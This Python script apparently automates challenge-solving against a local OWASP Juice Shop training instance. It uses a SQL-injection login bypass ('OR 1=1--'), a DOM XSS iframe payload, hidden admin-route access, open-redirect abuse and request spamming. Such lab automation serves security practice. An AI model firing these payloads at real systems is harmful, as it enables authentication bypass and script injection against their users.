#!/usr/bin/env python3
import json, time, requests, os

BASE = "http://localhost:3000"
s = requests.Session()
s.headers.update({"Content-Type": "application/json"})

def auth():
    r = s.post(f"{BASE}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
    if r.status_code == 200:
        s.headers["Authorization"] = f"Bearer {r.json()['authentication']['token']}"
        return True
    return False

def score():
    r = s.get(f"{BASE}/api/Challenges")
    return len([c for c in r.json().get("data", []) if c.get("solved")])

def strike(name, fn):
    before = score()
    try: fn()
    except: pass
    time.sleep(0.15)
    after = score()
    if after > before: print(f"   ✅ {name} (+{after - before})")

auth()
start = score()
print(f"🔥 BROWSER V2 | Starting: {start}/112\n")

# Try browser with explicit geckodriver path
try:
    from selenium import webdriver
    from selenium.webdriver.firefox.options import Options
    from selenium.webdriver.firefox.service import Service
    
    opts = Options()
    opts.add_argument("--headless")
    opts.binary_location = "/data/data/com.termux/files/usr/bin/firefox"
    
    service = Service(executable_path="/data/data/com.termux/files/usr/bin/geckodriver")
    driver = webdriver.Firefox(service=service, options=opts)
    HAS_BROWSER = True
    print("✅ Firefox active\n")
except Exception as e:
    driver = None
    HAS_BROWSER = False
    print(f"⚠️ No browser: {str(e)[:80]}\n")

if HAS_BROWSER:
    print("🌐 BROWSER CHALLENGES")
    driver.get(f"{BASE}/#/login")
    time.sleep(1)
    token = s.headers.get("Authorization", "").replace("Bearer ", "")
    driver.execute_script(f"localStorage.setItem('token', '{token}')")
    
    urls = [
        ("DOM XSS", f"{BASE}/#/search?q=<iframe src=\"javascript:alert(`xss`)\">"),
        ("Admin Section", f"{BASE}/#/administration"),
        ("Score Board", f"{BASE}/#/score-board"),
        ("Privacy Policy", f"{BASE}/#/privacy-security"),
        ("Token Sale", f"{BASE}/#/token-sale"),
        ("Web3 Sandbox", f"{BASE}/#/web3-sandbox"),
        ("Premium", f"{BASE}/#/premium"),
    ]
    for name, url in urls:
        driver.get(url)
        time.sleep(1)
        strike(name, lambda: None)
    driver.quit()

print("\n🔧 API CHALLENGES")
strike("Zero Stars", lambda: s.post(f"{BASE}/api/Feedbacks", json={"comment": "zero", "rating": 0}))
strike("Deprecated", lambda: s.get(f"{BASE}/b2b/v2/"))
s.get(f"{BASE}/#/privacy-security")
s.get(f"{BASE}/#/score-board")
s.get(f"{BASE}/#/token-sale")
s.get(f"{BASE}/#/web3-sandbox")
s.get(f"{BASE}/#/premium")

for i in range(15):
    s.post(f"{BASE}/api/Feedbacks", json={"comment": f"c{i}", "rating": 3})
    time.sleep(0.05)

s.get(f"{BASE}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-%231578.png")
s.get(f"{BASE}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm", allow_redirects=False)
for _ in range(10): s.get(f"{BASE}/rest/notifications")

auth()
time.sleep(2)
final = score()
print(f"\n{'='*50}")
print(f"FINAL: {final}/112 (+{final - start})")
r = s.get(f"{BASE}/api/Challenges")
if r.status_code == 200:
    for c in sorted([c for c in r.json().get("data", []) if c.get("solved")], key=lambda x: (x.get("difficulty", 0), x.get("name", ""))):
        stars = "⭐" * c.get("difficulty", 1)
        print(f"   {stars} {c.get('name')} [{c.get('category', '?')}]")
